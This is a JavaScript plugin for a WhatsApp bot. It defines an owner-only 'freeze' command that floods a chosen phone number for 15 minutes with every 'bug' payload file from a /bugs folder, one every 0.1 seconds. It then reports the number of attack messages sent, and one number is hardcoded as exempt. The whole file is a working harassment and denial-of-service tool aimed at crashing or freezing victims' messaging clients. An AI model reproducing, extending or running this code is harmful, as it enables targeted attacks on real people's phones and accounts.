const { cmd } = require('../command');
const config = require('../config');
const fs = require('fs');
const path = require('path');

cmd({
  pattern: 'freeze',
  desc: 'Owner only command to send freeze attack messages from /bugs',
  category: 'bug',
  react: '❄️',
  filename: __filename
}, async (bot, mek, m, { from, reply }) => {
  try {
    const prefix = config.PREFIX || '.';
    const botNumber = await bot.decodeJid(bot.user.id);
    const senderId = m.sender;
    const allowedUsers = [
      botNumber,
      config.OWNER_NUMBER + '@s.whatsapp.net',
      ...(config.SUDO || []).map(n => n + '@s.whatsapp.net')
    ];
    const protectedNumbers = ['13058962443']; // Pa atake nimewo sa

    const body = m.body || '';
    const cmdName = body.startsWith(prefix)
      ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
      : '';
    if (cmdName !== 'freeze') return;

    if (!allowedUsers.includes(senderId)) {
      return await bot.sendMessage(from, {
        text: '*🚫 This command is for owner only.*'
      }, { quoted: mek });
    }

    const args = body.trim().split(/\s+/).slice(1);
    let targetNumber;

    if (m.isGroup) {
      targetNumber = senderId.split('@')[0]; // si group, vize moun
    } else if (args.length > 0 && !isNaN(args[0])) {
      targetNumber = args[0]; // sinon pran arg
    }

    if (!targetNumber) {
      return await bot.sendMessage(from, {
        text: `❌ Usage:\n${prefix}freeze <number>\n\n🧊 Ou ka itilize l nan group san mete nimewo`
      }, { quoted: mek });
    }

    if (protectedNumbers.includes(targetNumber)) {
      return await bot.sendMessage(from, {
        text: '🛡️ This number is protected.'
      }, { quoted: mek });
    }

    const targetJid = `${targetNumber}@s.whatsapp.net`;
    const bugsDir = path.join(__dirname, '../bugs');
    const bugFiles = fs.readdirSync(bugsDir).filter(f => f.endsWith('.js'));

    if (bugFiles.length === 0) {
      return await bot.sendMessage(from, {
        text: '📁 Pa gen payload nan /bugs'
      }, { quoted: mek });
    }

    await bot.sendMessage(from, {
      text: `❄️ *FREEZE LAUNCHING...*\n🎯 Target: +${targetNumber}\n📦 Payloads: ${bugFiles.length}\n🕒 Duration: 15 minutes`,
    }, { quoted: mek });

    const endTime = Date.now() + 15 * 60 * 1000;
    let count = 0;

    while (Date.now() < endTime) {
      for (const file of bugFiles) {
        try {
          const payloadPath = path.join(bugsDir, file);
          let bugPayload = require(payloadPath);

          // convert export default string
          if (typeof bugPayload === 'object' && typeof bugPayload.default === 'string') {
            const msg = bugPayload.default;
            bugPayload = async (bot, number) => {
              await bot.sendMessage(`${number}@s.whatsapp.net`, { text: msg });
            };
          }

          // plain string
          if (typeof bugPayload === 'string') {
            const msg = bugPayload;
            bugPayload = async (bot, number) => {
              await bot.sendMessage(`${number}@s.whatsapp.net`, { text: msg });
            };
          }

          if (typeof bugPayload === 'function') {
            await bugPayload(bot, targetNumber);
            count++;
          }

        } catch (e) {
          console.error(`❌ Error in ${file}:`, e.message);
        }

        await new Promise(r => setTimeout(r, 100)); // 0.1s
      }
    }

    await bot.sendMessage(targetJid, {
      text: `✅ *FREEZE COMPLETED*\n🧊 Total Sent: ${count}`
    });

    await bot.sendMessage(from, {
      text: `✅ *FREEZE attack done on +${targetNumber}*\n📤 Messages sent: ${count}`
    }, { quoted: mek });

  } catch (error) {
    console.error(error);
    reply(`❌ Error: ${error.message}`);
  }
});
